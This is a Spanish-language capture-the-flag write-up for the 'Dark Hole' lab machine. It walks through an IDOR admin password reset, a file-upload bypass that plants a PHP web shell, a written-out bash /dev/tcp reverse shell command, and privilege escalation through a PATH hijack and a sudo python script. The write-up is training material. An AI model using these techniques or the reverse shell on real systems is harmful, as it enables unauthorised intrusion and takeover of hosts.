# Dark Hole

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: Web Enumeration /
Abusing password change panel - Password change for admin user /
Abusing File Upload - Uploading malicious PHAR archive /
Abusing custom SUID binary - User Pivoting /
Abusing sudoers privilege - Python script manipulation [Privilege Escalation]

Te prepara para las **Certificaciones**: eWPT, eJPT<br>

![image](https://github.com/user-attachments/assets/d278684f-8615-4ff2-a1da-fdc0ac1327ac)<br><br>

# Reconocimiento

Encontramos la IP en la red usando `arp-scan`<br>

![image](https://github.com/user-attachments/assets/16666d53-8785-4032-826b-f73fea5239c1)<br><br>


Utilizando `nmap` encontramos los puertos mas comunes<br>

![image](https://github.com/user-attachments/assets/fb2b9f36-cdfd-4dcf-b973-a57b3d0a42ab)

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>


Una vez nos registramos en la pagina y nos logeamos, vemos que el identificador que nos da  es `id=2` pero si con `burpsuite` interceptamos esa petición ponemos `id=1` y cambiamos el password a `admin1`, lo que pasa es que cambiamos la contraseña del usuario `admin` y contraseña ahora `admin1`.<br>


![image](https://github.com/user-attachments/assets/bc9577a1-ae3c-47c8-9df5-b6c1acb77fe2)<br><br>

# Subida de archivo

Ataque de fuerza bruta con `burpsuite`, marcamos la extensión. (Código php malicioso)<br>

![image](https://github.com/user-attachments/assets/f8b66c53-cd4a-4ec8-b328-38aefa2f31fa)<br><br>


Agregamos los Payloads.<br>

![image](https://github.com/user-attachments/assets/88e1942c-af31-48b6-988f-36bb9c31b8af)<br><br>


En `Grep - Extract` seleccionamos `Sorry, Allow Ex : jpg,png,gif`<br>

![image](https://github.com/user-attachments/assets/f87e977f-2787-44e4-b11e-a4fbb8bc839d)<br><br>


Una vez damos `Start Attack` vemos todas las extensiones que se subieron.<br>

![image](https://github.com/user-attachments/assets/9f95a496-2196-45f8-92bc-435520af8fbe)<br><br>


Vamos al directorio `upload` y vemos el `cmd.phtml`<br>

![image](https://github.com/user-attachments/assets/14f23e96-b9d7-409e-a732-db3749fa7892)<br><br>


Ganamos acceso con una reverse shell `http://192.168.0.150/upload/cmd.phtml?cmd=bash -c "bash -i >& /dev/tcp/192.168.0.150/443 0>&1"`, y nos ponemos en escucha con `rlwrap nc -nlvp 443`<br>

![image](https://github.com/user-attachments/assets/4ec8d9d2-859a-457b-8053-70997280d3c1)<br><br>

# Escalada de privilegios

En `/home/john` vemos un script SUID `toto` que es una copia del comando `id`, Podemos intuir que no tiene la ruta ABSOLUTA del comando si no, la RELATIVA osea que se puede acontecer un `Path Hijacking`.<br>

![image](https://github.com/user-attachments/assets/a2b5de9c-a9ec-45a8-807b-c4813d4e18a7)<br><br>

En `/tmp` creamos un archivo `id` que contenga `bash -p`<br>

![image](https://github.com/user-attachments/assets/ef65085c-4a69-4d67-9d43-3372614664f3)<br><br>


Ahora ponemos el directorio `/tmp` en el path, para que busque el `id` por este directorio primero, ya que es una ruta relativa y no absoluta.<br>

![image](https://github.com/user-attachments/assets/a151bb8f-deb9-4747-8f66-9f997c427aa9)<br><br>

Al ejecutar el script `toto` nos convierte en `john`<br>

![image](https://github.com/user-attachments/assets/b11e14f4-bdb5-4599-b492-c12eb833bb17)<br><br>


Vemos que podemos ejecutar `file.py` como root<br>

![image](https://github.com/user-attachments/assets/2fc4a903-99d5-4729-a601-8ec7f9784bed)<br><br>

En `file.py` ponemos:<br>

![image](https://github.com/user-attachments/assets/b56be366-4524-4219-a000-67a73a901c74)<br><br>


Ejecutamos el `file.py` y me convierto en root:<br>

![image](https://github.com/user-attachments/assets/c95f9580-7f7c-454a-b27a-bcb57a9c8813)<br><br>

Flag final:<br><br>

![image](https://github.com/user-attachments/assets/8339600e-e039-4f41-9466-5707b56dc0fb)<br><br>


